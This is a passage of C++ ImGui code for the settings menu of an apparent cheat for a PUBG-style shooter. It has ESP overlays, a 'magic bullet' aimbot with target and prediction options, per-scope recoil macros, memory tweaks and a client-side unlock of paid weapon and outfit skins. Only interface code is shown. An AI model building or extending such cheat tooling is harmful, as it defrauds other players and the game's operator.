											ImGui::SliderInt("##vahicle_Text_item_Tuk_TextSize", &Setting::vahicle_Text_item_Tuk_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("Tuk", (float*)&Setting::vahicle_Text_item_Tuk_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::EndTable();
										}
										//ImGui::EndTabBar();

									}
									ImGui::EndChild();
								}
								else if (Settings::EspTab == 5)
								{
									ImGui::SetCursorPos({74, 150 });
									ImGui::BeginChild("##1", ImVec2(570, 270), true, ImGuiWindowFlags_NoBackground);
									{
										ImGui::Checkbox("Bomb Alert", &Setting::BombAlert);
										ImGui::Checkbox("Aim Warning", &Setting::IsimingAtYou);
										ImGui::Checkbox("Dots", &Setting::dots);
										if (Setting::dots)
										{
											if (dotsstyle == 0 || dotsstyle == 1)
											{
												ImGui::SameLine();
												ImGui::PushItemWidth(90);
												ImGui::SetCursorPosX({ 150 });
												const char* dotsstyleee[] = { "Circle Filled","Circle","Triangle" ,"Triangle Filled" };
												const char* dotsstyledotsstyle = dotsstyleee[dotsstyle];
												if (ImGui::BeginCombo("dotsstyleee", dotsstyledotsstyle, ImGuiComboFlags_HeightSmall))
												{
													for (int n = 0; n < IM_ARRAYSIZE(dotsstyleee); n++)
													{
														const bool is_selected = (dotsstyle == n);
														if (ImGui::Selectable(dotsstyleee[n], is_selected))
															dotsstyle = n;
														if (is_selected)
															ImGui::SetItemDefaultFocus();
													}
													ImGui::EndCombo();
												}
												ImGui::SameLine(245);
												ImGui::SliderInt("##DotsRange", &Setting::DotsRange, 1, 50, "Range : %0.1f");
												ImGui::SameLine();
												ImGui::SliderInt("##DotsRadius", &Setting::DotsRadius, 1, 10, "Radius : %0.1f");
												ImGui::SameLine();
												ImGui::SliderInt("##DotsThickness", &Setting::DotsThickness, 1, 10, "Thikness : %0.1f");
											}
											else if (dotsstyle == 2 || dotsstyle == 3)
											{
												ImGui::SameLine();
												ImGui::PushItemWidth(90);
												ImGui::SetCursorPosX({ 150 });
												const char* dotsstyleee[] = { "Circle Filled","Circle","Triangle" ,"Triangle Filled" };
												const char* dotsstyledotsstyle = dotsstyleee[dotsstyle];
												if (ImGui::BeginCombo("dotsstyleee", dotsstyledotsstyle, ImGuiComboFlags_HeightSmall))
												{
													for (int n = 0; n < IM_ARRAYSIZE(dotsstyleee); n++)
													{
														const bool is_selected = (dotsstyle == n);
														if (ImGui::Selectable(dotsstyleee[n], is_selected))
															dotsstyle = n;
														if (is_selected)
															ImGui::SetItemDefaultFocus();
													}
													ImGui::EndCombo();
												}
												ImGui::SameLine(245);
												ImGui::SliderInt("##DotsRange", &Setting::DotsRange, 1, 50, "Range : %0.1f");

											}
										}

										ImGui::Checkbox("Total Enemy", &Setting::TotalEnemy);
										if (Setting::TotalEnemy)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(130);
											ImGui::SetCursorPosX({ 150 });
											const char* TotalEnemyStylee[] = { "Style 1","Style 2","Style 3" ,"Style 4" };
											const char* combo_label1 = TotalEnemyStylee[TotalEnemyStyle];
											if (ImGui::BeginCombo("TotalEnemyStylee", combo_label1, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(TotalEnemyStylee); n++)
												{
													const bool is_selected = (TotalEnemyStyle == n);
													if (ImGui::Selectable(TotalEnemyStylee[n], is_selected))
														TotalEnemyStyle = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}
											if (TotalEnemyStyle == 0 || TotalEnemyStyle == 3)
											{
												ImGui::SameLine(530);
												ImGui::ColorEdit4("###BorderColor", (float*)&BorderColor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
											}
										}
										ImGui::Checkbox("Nearst Ar Line", &Setting::nearstAR);
										if (Setting::nearstAR)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(150);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderFloat("##NearstArLineThikness", &Setting::NearstArLineThikness, 1, 30, "Line Thikness : %0.1f");
											ImGui::SameLine(530);
											ImGui::ColorEdit4("###nearstARColors", (float*)&Setting::nearstARColors, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
										}
										ImGui::Checkbox("LineOfSight", &Setting::EnemyLineOfSight);
										if (Setting::EnemyLineOfSight)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(150);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderFloat("##enemyLineofSightSize", &Setting::enemyLineofSightSize, 1, 30, "Line Size : %0.1f");
											ImGui::SameLine(530);
											ImGui::ColorEdit4("###ENEMYLINEOFSIGHTCOLOR", (float*)&Setting::EnemyLineOfSightColor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
										}
										ImGui::Checkbox("2D Radar", &Setting::radar);
										ImGui::Checkbox("Redzone Location", &Setting::redzone);
										ImGui::Checkbox("Safe Zone Location", &Setting::ZoneCenter);
									}
									ImGui::EndChild();
								}

							}
							if (Setting::KeyVersion == 1)//now all good now all working good okay??
							{
								if (Settings::MainTab == 2)
								{

									//         if (ImGui::Button("Aimbot", ImVec2(120, 25)))
											 //Settings::AimTab = 2;
											 //ImGui::SetCursorPos({ 786.5, 60 });
											 //if (ImGui::Button("Macro Settings", ImVec2(120, 25)))
											 //Settings::AimTab = 3;
									if (Settings::AimTab == 1)
									{

										ImGui::SetCursorPos({74, 120 });
										ImGui::BeginChild("##1", ImVec2(570, 255), true, ImGuiWindowFlags_NoBackground);
										{
											ImGui::Checkbox("Magic Bullet", &Setting::MagicBulletticked);
											{
												if (Setting::MagicBulletticked)
												{
													Setting::MagicBullet = true;


												}
												else
												{
													Setting::MagicBullet = false;
												}
											}

											if (Setting::MagicBulletticked)
											{
												ImGui::Checkbox("Auto Magic", &Setting::AutoAim);

												const char* curraim[] = { "Head", "Body", "Foot","Auto" };
												const char* curraimcurraim = curraim[Setting::curraim];
												if (ImGui::BeginCombo("curraimcurraim", curraimcurraim, ImGuiComboFlags_HeightSmall))
												{
													for (int n = 0; n < IM_ARRAYSIZE(curraim); n++)
													{
														const bool is_selected = (Setting::curraim == n);
														if (ImGui::Selectable(curraim[n], is_selected))
															Setting::curraim = n;
														if (is_selected)
															ImGui::SetItemDefaultFocus();
													}


													ImGui::EndCombo();
												}

												ImGui::Text("Switch Key");

												ImGui::SameLine();
												ImGui::PushItemWidth(150);
												ImGui::SetCursorPosX({ 190 });
												ImGui::Hotkey("##AimSwichKey", &Setting::AimSwichKey, ImVec2(180.0f, 25));
												ImGui::Checkbox("Attach Only Visible", &Setting::AttachOnVisible);

												//ImGui::Text("Refresh Key");
												//ImGui::SameLine();
												//ImGui::PushItemWidth(150);
												//ImGui::SetCursorPosX({ 190 });
												//ImGui::Hotkey("##RefreshKey", &Setting::RefreshKey, ImVec2(180.0f, 25));
												ImGui::Checkbox("Magic Bullet Range", &Setting::BulletTrackingRange);
												if (Setting::BulletTrackingRange)
												{
													ImGui::SameLine();
													ImGui::PushItemWidth(150);
													ImGui::SetCursorPosX({ 190 });
													ImGui::SliderInt("###MagicRange", &Setting::magicrange, 20, 380);
												}
												ImGui::Checkbox("Fov Circle", &Setting::fovcircle);
												if (Setting::fovcircle)
												{
													ImGui::SameLine();
													ImGui::PushItemWidth(150);
													ImGui::SetCursorPosX({ 190 });
													ImGui::SliderInt("###fovFOVsize", &Setting::fovcircleredus, 1, 1000);

													ImGui::SameLine(580);
													ImGui::ColorEdit4("##FovCircle", (float*)Setting::fovcirclecolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
												}
												//ImGui::Checkbox("Legit Tracking", &Setting::Legitrack);
												ImGui::Checkbox("Skip Knocked", &Setting::SkipKnocked);
												ImGui::Checkbox("Skip Bot", &Setting::SkipBots);

												ImGui::Checkbox("Magic Status", &Setting::aimbotposition);
												ImGui::Checkbox("Aim Line", &Setting::MAgicline);
												if (Setting::MAgicline)
												{
													ImGui::SameLine();
													ImGui::Combo("#MAgiclinee", &MAgiclinee, "Static\0Cross");
													ImGui::SameLine(580);
													ImGui::ColorEdit4("##magicline", (float*)Setting::magicline, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
												}
												ImGui::Checkbox("Aim Predection", &Setting::PREDICTION);
												//if (Setting::PREDICTION)
												//{
												if (Setting::curraim == 0)
												{
													ImGui::SliderInt("###magicv", &Setting::magicv, 1, 10, "Z Position : %0.1f");
												}
												//}
											}
										}
										ImGui::EndChild();
									}
									if (Settings::AimTab == 2)
									{

										ImGui::SetCursorPos({74, 120 });
										ImGui::BeginChild("##1", ImVec2(570, 250), true, ImGuiWindowFlags_NoBackground);
										{
											ImGui::Checkbox("Aimbot", &Setting::Aimbot);
											if (Setting::Aimbot)
											{
												const char* curraim[] = { "Head", "Body", "Foot","Auto" };
												const char* curraimcurraim = curraim[Setting::curraim];
												if (ImGui::BeginCombo("curraimcurraim", curraimcurraim, ImGuiComboFlags_HeightSmall))
												{
													for (int n = 0; n < IM_ARRAYSIZE(curraim); n++)
													{
														const bool is_selected = (Setting::curraim == n);
														if (ImGui::Selectable(curraim[n], is_selected))
															Setting::curraim = n;
														if (is_selected)
															ImGui::SetItemDefaultFocus();
													}


													ImGui::EndCombo();
												}
												ImGui::Text("Aimbot Key");
												ImGui::SameLine();
												ImGui::PushItemWidth(150);
												ImGui::SetCursorPosX({ 190 });
												ImGui::Hotkey("##AimbotKey", &Setting::AimbotKey, ImVec2(180.0f, 25));
												ImGui::Text("Switch Key");
												ImGui::SameLine();
												ImGui::PushItemWidth(150);
												ImGui::SetCursorPosX({ 190 });
												ImGui::Hotkey("##AimSwichKey", &Setting::AimSwichKey, ImVec2(180.0f, 25));

												ImGui::Text("Refresh Key");
												ImGui::SameLine();
												ImGui::PushItemWidth(150);
												ImGui::SetCursorPosX({ 190 });
												ImGui::Hotkey("##RefreshKey", &Setting::RefreshKey, ImVec2(180.0f, 25));
												ImGui::Checkbox("Aimbot Range", &Setting::BulletTrackingRange);
												if (Setting::BulletTrackingRange)
												{
													ImGui::SameLine();
													ImGui::PushItemWidth(150);
													ImGui::SetCursorPosX({ 190 });
													ImGui::SliderInt("###MagicRange", &Setting::magicrange, 20, 380);
												}
												ImGui::Text("Aimbot Speed");
												ImGui::SameLine();
												ImGui::PushItemWidth(150);
												ImGui::SetCursorPosX({ 190 });
												ImGui::SliderInt("###Aimspeed", &Setting::Aimspeed, 1, 15);
												ImGui::Checkbox("Fov Circle", &Setting::fovcircle);
												if (Setting::fovcircle)
												{
													ImGui::SameLine();
													ImGui::PushItemWidth(150);
													ImGui::SetCursorPosX({ 190 });
													ImGui::SliderInt("###fovFOVsize", &Setting::fovcircleredus, 1, 1000);

													ImGui::SameLine(580);
													ImGui::ColorEdit4("##FovCircle", (float*)Setting::fovcirclecolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
												}
											}
										}
										ImGui::EndChild();
									}
									if (Settings::AimTab == 3)
									{

										ImGui::SetCursorPos({74, 120 });
										ImGui::BeginChild("##1", ImVec2(565, 255), true, ImGuiWindowFlags_NoBackground);
										{
											if (ImGui::BeginTable("ITEM_Macro", 3, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
											{
												ImGui::TableSetupColumn("Enable");
												ImGui::TableSetupColumn("Icon");
												ImGui::TableSetupColumn("Font Size");
												ImGui::TableHeadersRow();

												ImGui::TableNextColumn();
												ImGui::Checkbox("Iron", &Setting::micro_Iron);
												ImGui::TableNextColumn();
												ImGui::Image(DX11::Holo, ImVec2(30, 30));
												ImGui::TableNextColumn();
												ImGui::SliderFloat("##microaxis_Iron", &Setting::microaxis_Iron.Y, 0, 50);

												ImGui::TableNextColumn();
												ImGui::Checkbox("RedDot", &Setting::micro_RedDot);
												ImGui::TableNextColumn();
												ImGui::Image(DX11::RedDot, ImVec2(30, 30));
												ImGui::TableNextColumn();
												ImGui::SliderFloat("##microaxis_RedDot", &Setting::microaxis_RedDot.Y, 0, 50);
												ImGui::TableNextColumn();

												ImGui::Checkbox("X2", &Setting::micro_X2);
												ImGui::TableNextColumn();
												ImGui::Image(DX11::S2X, ImVec2(30, 30));
												ImGui::TableNextColumn();
												ImGui::SliderFloat("##microaxis_X2", &Setting::microaxis_X2.Y, 0, 50);

												ImGui::TableNextColumn();
												ImGui::Checkbox("X3", &Setting::micro_X3);
												ImGui::TableNextColumn();
												ImGui::Image(DX11::S3X, ImVec2(30, 30));
												ImGui::TableNextColumn();
												ImGui::SliderFloat("##microaxis_X3", &Setting::microaxis_X3.Y, 0, 50);

												ImGui::TableNextColumn();
												ImGui::Checkbox("X4", &Setting::micro_X4);
												ImGui::TableNextColumn();
												ImGui::Image(DX11::S4X, ImVec2(30, 30));
												ImGui::TableNextColumn();
												ImGui::SliderFloat("##microaxis_X4", &Setting::microaxis_X4.Y, 0, 50);
												ImGui::TableNextColumn();

												ImGui::Checkbox("X6", &Setting::micro_X6);
												ImGui::TableNextColumn();
												ImGui::Image(DX11::S6X, ImVec2(30, 30));
												ImGui::TableNextColumn();
												ImGui::SliderFloat("##microaxis_X6", &Setting::microaxis_X6.Y, 0, 50);
												ImGui::EndTable();
											}

										}
										ImGui::EndChild();
									}

								}
								if (Settings::MainTab == 3)
								{
									ImGui::SetCursorPos({ 74, 130 });
									if (ImGui::Button("Safe Features", ImVec2(120, 25)))
										Settings::MemoryTab = 1;
									ImGui::SetCursorPos({ 230, 130 });
									if (ImGui::Button("Mod Skins", ImVec2(125, 25)))
										Settings::MemoryTab = 2;
			
									if (Settings::MemoryTab == 1)
									{
										ImGui::SetCursorPos({74, 160 });
										ImGui::BeginChild("##1", ImVec2(570, 200), true, ImGuiWindowFlags_NoBackground);
										{
											ImGui::Checkbox("CameraView", &Setting::CameraView);
											if (Setting::CameraView)
											{
												ImGui::SameLine();
												ImGui::PushItemWidth(150);
												ImGui::SetCursorPosX({ 190 });
												ImGui::SliderInt("####Camera view", &Setting::view, 220, 2000);
											}
											ImGui::Checkbox("Show Damage", &Setting::ShowDamage);
											ImGui::Checkbox("Quick Loot", &Setting::Quickloot);
											ImGui::Checkbox("Force Tpp", &Setting::ForceTPP);
											ImGui::Checkbox("X Effect", &Setting::XEffect);

											// 
											//if (Setting::isSpinning)
											//{
											//	ImGui::SameLine();
											//	ImGui::PushItemWidth(180);
											//	ImGui::SetCursorPosX({ 190 });										
											//	ImGui::Hotkey("##SpiningKeys", &Setting::SpiningKeys, ImVec2(180.0f, 24));
											//    ImGui::SameLine();
											//	ImGui::SliderInt("####SPINING", &Setting::PlayerSpining, 1, 100);
											//    
											//}
										}
										ImGui::EndChild();
									}
									else if (Settings::MemoryTab == 2)
									{
										ImGui::SetCursorPos({74, 150 });
										ImGui::Checkbox("ModSkin", &Setting::ModSkin);
										ImGui::SetCursorPos({ 74, 180 });
										ImGui::BeginChild("##1", ImVec2(570, 190), true, ImGuiWindowFlags_NoBackground);
										{
                                            if (ImGui::BeginTabBar("Modskin"))
                                            {
                                               if (ImGui::BeginTabItem("Player"))
                                               {
											   
                                                   if (ImGui::BeginTable("split", 2, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg)) {
                                                       ImGui::TableSetupColumn("Name");
											   
                                                       ImGui::TableSetupColumn("Skin", ImGuiTableColumnFlags_NoResize);
											   
                                                       ImGui::TableHeadersRow();
                                                       ImGui::TableNextColumn();
                                                       ImGui::Text("Suit");
											   
                                                       ImGui::TableNextColumn();
											   
				                                       ImGui::PushItemWidth(200);
			 												ImGui::Combo(("016##016"), &Setting::sute::sutes, ("No Skin\0Golden Pharaoh X-Suit (7-Star)\0Poseidon X-Suit (7-Star)\0Avalanche X-Suit (7-Star)\0Silvanus X-Suit (7-Star)\0Stygian Liege X-Suit (7-Star)\0Marmoris X-Suit (7-Star)\0Marmoris X-Suit (7-Star)\0Blood Raven X-Suit (6-Star)\0Iridescence X-Suit (6-Star)\0Arcane Jester X-Suit (6-Star)\0Mummy (White)\0Mummy (Yellow)\0Flamewraith Set\0Ominous Fox Set\0Fireman Suit\0foxy flare\0Golden trigger\0Invader Set\0Dystopian Survivor Set\0Glacier Set\0The Fool's Delight\0Starsea Admiral Set\0Moondrop Eterna\0Foxy Flare\0Silver Guru\0Boxerbolt\0Wrathful Neptune\0Crimson Ephialtes\0Bloody Noon\0Nether Visage\0Glacial Bride\0Unicorn Set\0Majestic Cavalry\0Infected Patient\0Masked Psychic Robe\0Envoy of Death\0Bramble Overlord\0Lightning Nebula\0Cosmic Inquisitor\0Godzilla's\0SnowflakeBear\0Arctic Witch\0Glacier\0Charged Armor\0Satoru Gojo Cosplay\0Black Shark Diving\0Winter Highness\0Kurapika Character\0Killua Character\0Gon Character\0Leorio Character\0Extreme Cyberwear\0Melee Maiden\0Inferno Feind"));

											   
                                                       ImGui::TableNextColumn();
											   
                                                       ImGui::Text("BagBack");
											   
                                                       ImGui::TableNextColumn();
											   
					                    	         ImGui::PushItemWidth(200);
												ImGui::Combo(("022##022"), &Setting::Backpack::Backpack3, ("No Skin \0Wraith Lord Backpack \0The Fool Backpack\0Godzilla \0Aquatic Fury \0Butterfly Wings \0Arctic Witch \0Boxerbolt \0Blood Lotus \0Blood Rain \0Dazzling Youth \0Bloodthirsty Joker \0Trickster \0Foxy Flare "));
 		
											   
                                                       ImGui::TableNextColumn();
                                                       ImGui::Text("Helmet");
                                                       ImGui::TableNextColumn();
					                    	         ImGui::PushItemWidth(200);							                 
												ImGui::Combo(("Helmets##017"), &Setting::helmet::helmets3, ("No Skin \0GacktMoon Godzilla-Mecha  \0Urban Ghost \0Godzilla \0Masked Psychic \0Minimalist Tech \0Dragonling \0Dragon Guard \0Dragon Guard \0Sky Barrier \0Inferno Rider "));
	
											   
                                                       ImGui::TableNextColumn();
                                                       ImGui::Text("Parachute");
                                                       ImGui::TableNextColumn();
					                    	         ImGui::PushItemWidth(200);							                 
												       ImGui::Combo(("11022##022"), &Setting::parashot::id, ("No Skin \0Blood Raven - Parachute\0Enigmatic Nomad - Parachute\0Poseidon - Parachute\0Pharaoh's Scarab - Parachute\0Paperfold Gambit - Parachute\0Labyrinth Beast - Parachute\0Flamewraith - Parachute\0Mega Kitty - Parachute\0Mega Yeti - Parachute\0Endless Glory - Parachute\0Magma Skull - Parachute\0Aquatic Fury - Parachute\0CyberGen: Zero - Parachute\0Radiant Phoenix Adarna - Parachute\0Will of Horus - Parachute\0Anubian Magistrate - Parachute"));
	
											   
											   
											   
                                                       ImGui::EndTable();
                                                   }
											   
											   
                                                   ImGui::EndTabItem();
                                               }
											   
                                               if (ImGui::BeginTabItem("Weapons"))
                                               {
											   
                                                   if (ImGui::BeginTabBar("WeaponsSkin"))
                                                   {
                                                       if (ImGui::BeginTabItem("AR"))
                                                       {
                                                           if (ImGui::BeginTable("split2", 2, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg)) 
					                    	 			{
                                                               ImGui::TableSetupColumn("Name");
											   
                                                               ImGui::TableSetupColumn("Skin", ImGuiTableColumnFlags_NoResize);
											   
                                                               ImGui::TableHeadersRow();
                                                               ImGui::TableNextColumn();
                                                               ImGui::Text("M416");
                                                               ImGui::TableNextColumn();
                                                          		ImGui::PushItemWidth(200);
														ImGui::Combo(("101##101"), &Setting::Skins::m416::skin, ("No Skin \0Glacier - M416\0The Fool - M416\0Wanderer - M416\0Lizard - M416\0Call of the Wild - M416\0TechnoCore - M416\0Imperial Splendor - M416\0Silver Guru - M416\0Tidal Embrace - M416\0Shinobi Kami - M416\0Sealed Nether - M416"));

					                    	 				
					                    	 				ImGui::TableNextColumn();
                                                               ImGui::Text("AKM");
                                                               ImGui::TableNextColumn();
                                                          		ImGui::PushItemWidth(200);
														ImGui::Combo(("102##102"), &Setting::Skins::AKM::skin, ("No Skin \0Glacier - AKM\0The Seven Seas - AKM\0Sculpturer - AKM\0Roaring Tiger - AKM\0Desert Fossil - AKM\0Ghillie Dragon - AKM\0Gold Pirate - AKM\0Codebreaker - AKM\0Wandering Tyrant - AKM\0Starsea Admiral - AKM\0Decisive Day - AKM")); /// \0Bunny Munchkin - AKM

				                                               
				                                               
	
                                                               ImGui::TableNextColumn();
                                                               ImGui::Text("M16A4");                                              
                                                               ImGui::TableNextColumn();
					                    	                 ImGui::PushItemWidth(200);
														ImGui::Combo(("005##005"), &Setting::Skins::M16A4::skin, ("No Skin \0Blood & Bones - M16A4\0Aurora Pulse - M16A4\0Radiant Edge - M16A4\0Skeletal Core - M16A4\0Dracoguard - M16A4\0Sweetheart Surge - M16A4"));

					                    	 			    ImGui::TableNextColumn();
                                                               ImGui::Text("SCAR-L"); 													
					                    	                 ImGui::TableNextColumn();
					                    	                 ImGui::PushItemWidth(200);
														ImGui::Combo(("001##001"), &Setting::Skins::SCARL::skin, ("No Skin \0Water Blaster - SCAR-L\0Enchanted Pumpkin - SCAR-L\0Operation Tomorrow - SCAR-L\0Drop the Bass - SCAR-L\0Hextech Crystal - SCAR-L\0Thorn of Malice - SCAR-L\0Bloodstained Nemesis - SCAR-L\0Folly's Clasp - SCAR-L\0Folly's Clasp - Gold SCAR-L\0Serene Lumina - SCAR-L"));
	
 					                    	 			    ImGui::TableNextColumn();
                                                               ImGui::Text("M762"); 													
					                    	                 ImGui::TableNextColumn();
					                    	                 ImGui::PushItemWidth(200);
														ImGui::Combo(("002##002"), &Setting::Skins::M762::skin, ("No Skin \08-bit Unicorn - M762\0Lotus Fury - M762\0Concerto of Love - M762\0Deadly Precision - M762\0GACKT MOONSAGA - M762\0Stray Rebellion - M762\0Starcore - M762\0Messi Football Icon - M762\0Noctum Sunder - M762"));
	
 					                    	 			    ImGui::TableNextColumn();
                                                               ImGui::Text("GROZA"); 													
					                    	                 ImGui::TableNextColumn();
					                    	                 ImGui::PushItemWidth(200);
														ImGui::Combo(("104##104"), &Setting::Skins::GROZA::skin, ("No Skin \0Forest Raider - Groza\0Eventide Aria - Groza\0Ryomen Sukuna - Groza\0Splendid Battle - Groza\0River Styx - Groza\0Pumpkin Carol - Groza"));
					                    	 			    ImGui::TableNextColumn();
                                                               ImGui::Text("AUG"); 													
					                    	                 ImGui::TableNextColumn();
					                    	                 ImGui::PushItemWidth(200);
														ImGui::Combo(("004##004"), &Setting::Skins::AUG::skin, ("No Skin \0Wandering Circus - AUG\0Evangelion 4th Angel - AUG\0Forsaken Glace - AUG"));

 					                    	 			    ImGui::TableNextColumn();
                                                               ImGui::Text("QBZ"); 													
					                    	                 ImGui::TableNextColumn();
					                    	                 ImGui::PushItemWidth(200);
														ImGui::Combo(("105##105"), &Setting::Skins::QBZ::skin, ("No Skin \0Dazzling Sun - QBZ\0Fatal Strike - QBZ\0Nether Phantom - QBZ"));

 					                    	 			    ImGui::TableNextColumn();
                                                               ImGui::Text("ACE32"); 													
					                    	                 ImGui::TableNextColumn();
					                    	                 ImGui::PushItemWidth(200);
														ImGui::Combo(("103##103"), &Setting::Skins::ACE32::skin, ("No Skin \0Beam Blast - ACE32\0Icicle Spike - ACE32"));

 					                    	 			    ImGui::TableNextColumn();
                                                               ImGui::Text("Honey Badger"); 													
					                    	                 ImGui::TableNextColumn();
					                    	                 ImGui::PushItemWidth(200);
														ImGui::Combo(("003##003"), &Setting::Skins::Honey::skin, ("No Skin \0Vivid Glare - Honey Badger"));

											   
                                                               ImGui::EndTable();
                                                           }
					                    	 		   ImGui::EndTabItem();
                                                       }
                                                       if (ImGui::BeginTabItem("SMG"))
                                                       {
											   
                                                           if (ImGui::BeginTable("split3", 2, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg)) 
					                    	 			{
                                                               ImGui::TableSetupColumn("Name");
											   
                                                               ImGui::TableSetupColumn("Skin", ImGuiTableColumnFlags_NoResize);
											   
                                                               ImGui::TableHeadersRow();
                                                               ImGui::TableNextColumn();
                                                               ImGui::Text("UMP");
                                                               ImGui::TableNextColumn();
                                                          		ImGui::PushItemWidth(200);
														ImGui::Combo(("106##106"), &Setting::Skins::UMP::skin, ("No Skin \0Cryofrost Shard - UMP45\0Dragonfire - UMP45\0EMP - UMP45\0Outlawed Fantasy - UMP45\0Platinum Ripper - UMP45\08-Bit Blast - UMP45\0Xmas Holiday - UMP45\0Rainbow Stinger - UMP45\0Marine Evolution\0Carnival Waves - UMP45"));

					                    	 				ImGui::TableNextColumn();
                                                               ImGui::Text("UZI");
                                                               ImGui::TableNextColumn();
                                                          		ImGui::PushItemWidth(200);
														ImGui::Combo(("006##006"), &Setting::Skins::UZI::skin, ("No Skin \0Savagery - UZI\0Ethereal Emblem - UZI\0Romantic Moments - UZI\0Shimmer Power - UZI\0Mystech - UZI\0Juicer - UZI\0Citrus Bliss - UZI"));

					                    	 				ImGui::TableNextColumn();
                                                               ImGui::Text("Vector");
                                                               ImGui::TableNextColumn();
                                                          		ImGui::PushItemWidth(200);
														ImGui::Combo(("108##108"), &Setting::Skins::Vctor::skin, ("No Skin \0Mecha Drake - Vector\0Blood Tooth - Vector\0Midnight Rose - Vector\0Cute Baddie - Vector\0Golden Earl - Vector\0Gilded Reaper - Vector\0Ultimate Predator - Vector"));

					                    	 				ImGui::TableNextColumn();
                                                               ImGui::Text("Thompson Gun");
                                                               ImGui::TableNextColumn();
                                                          		ImGui::PushItemWidth(200);
														ImGui::Combo(("107##107"), &Setting::Skins::Thome::skin, ("No Skin \0Candy Cane - Thompson\0Steampunk - Thompson"));
	
					                    	 				ImGui::TableNextColumn();
                                                               ImGui::Text("Bizon");
                                                               ImGui::TableNextColumn();
                                                          		ImGui::PushItemWidth(200);
														    ImGui::Combo(("007##007"), &Setting::Skins::Pithon::skin, ("No Skin \0Blazing Chameleon - Bizon\0Skullcrusher - Bizon\0Soldier Soul - Bizon"));

					                    	 			    ImGui::EndTable();
					                    	 			
                                                           }
											   
                                                           ImGui::EndTabItem();
                                                       }
                                                       if (ImGui::BeginTabItem("SNIPER"))
                                                       {
											   
                                                            if (ImGui::BeginTable("split555", 2, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg)) 
					                    	 			    {
                                                               ImGui::TableSetupColumn("Name");
											   
                                                               ImGui::TableSetupColumn("Skin", ImGuiTableColumnFlags_NoResize);
											   
                                                               ImGui::TableHeadersRow();
                                                               ImGui::TableNextColumn();
                                                               ImGui::Text("M24");
                                                               ImGui::TableNextColumn();
                                                          		ImGui::PushItemWidth(200);
														ImGui::Combo(("009##009"), &Setting::Skins::M24::skin, ("No Skin \0The Seven Seas - M24\0Pharaoh's Might - M24\0Killer Tune - M24\0Lady Butterfly - M24\0Circle of Life - M24\0Cadence Maestro - M24"));

                                                               ImGui::TableNextColumn();
                                                               ImGui::Text("AWM");                                              
                                                               ImGui::TableNextColumn();
					                    	                 ImGui::PushItemWidth(200);
														ImGui::Combo(("109##109"), &Setting::Skins::AWM::skin, ("No Skin \0Mauve Avenger - AWM\0Field Commander - AWM\0Godzilla - AWM\0Rainbow Drake - AWM\0Flamewave - AWM\0Serpengleam - AWM"));

					                    	 				
                                                               ImGui::TableNextColumn();
                                                               ImGui::Text("AMR");                                              
                                                               ImGui::TableNextColumn();
					                    	                 ImGui::PushItemWidth(200);
		                      
														ImGui::Combo(("010##010"), &Setting::Skins::AMR::skin, ("No Skin \0Crimson Ephialtes - AMR"));

					                    	 			    ImGui::TableNextColumn();
                                                               ImGui::Text("KAR98K"); 													
					                    	                 ImGui::TableNextColumn();
					                    	                 ImGui::PushItemWidth(200);
														ImGui::Combo(("110##110"), &Setting::Skins::kar::skin, ("No Skin \0Terror Fang - Kar98K\0Kukulkan Fury - Kar98K\0Night of Rock - Kar98K\0Moonlit Grace - Kar98K\0Gackt Moon - Kar98K\0Titanium Shark - Kar98K\0Lethal Code - Kar98K\0Nebula Hunter - Kar98K\0Violet Volt - Kar98K"));
	
											   
											   
                                                               ImGui::EndTable();
                                                           }
											   
                                                           ImGui::EndTabItem();
                                                       }
                                                       if (ImGui::BeginTabItem("DMR"))
                                                       {
                                                           if (ImGui::BeginTable("split3333333", 2, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg)) 
					                    	 			{
                                                               ImGui::TableSetupColumn("Name");
											   
                                                               ImGui::TableSetupColumn("Skin", ImGuiTableColumnFlags_NoResize);
											   
                                                               ImGui::TableHeadersRow();
                                                               ImGui::TableNextColumn();
                                                               ImGui::Text("VSS");
                                                               ImGui::TableNextColumn();
                                                          		ImGui::PushItemWidth(200);
														ImGui::Combo(("112##112"), &Setting::Skins::VSS::skin, ("No Skin \0Crow - VSS"));

                                                               ImGui::TableNextColumn();
                                                               ImGui::Text("SKS");
                                                               ImGui::TableNextColumn();
                                                          	   ImGui::PushItemWidth(200);
                                                               ImGui::Combo(("111##111"), &Setting::Skins::SKS::skin, ("No Skin \0Lady Carmine - SKS\0Metal Medley - SKS\0Snowcapped Berg - SKS"));	
                                                              ImGui::TableNextColumn();
                                                               ImGui::Text("SLR");
                                                               ImGui::TableNextColumn();
                                                          	   ImGui::PushItemWidth(200);
														ImGui::Combo(("011##011"), &Setting::Skins::SLR::skin, ("No Skin \0Falling Blossom - SLR\0Mageblaze - SLR"));
                                                               ImGui::TableNextColumn();
                                                               ImGui::Text("Mini-14");
                                                               ImGui::TableNextColumn();
                                                          		ImGui::PushItemWidth(200);
														ImGui::Combo(("012##012"), &Setting::Skins::Mini14::skin, ("No Skin \0Icicle - Mini14\0Ethereal Beauty - Mini14\0Fortune Cat - Mini14"));
		
                                                               ImGui::TableNextColumn();
                                                               ImGui::Text("MK14");
                                                               ImGui::TableNextColumn();
                                                          		ImGui::PushItemWidth(200);
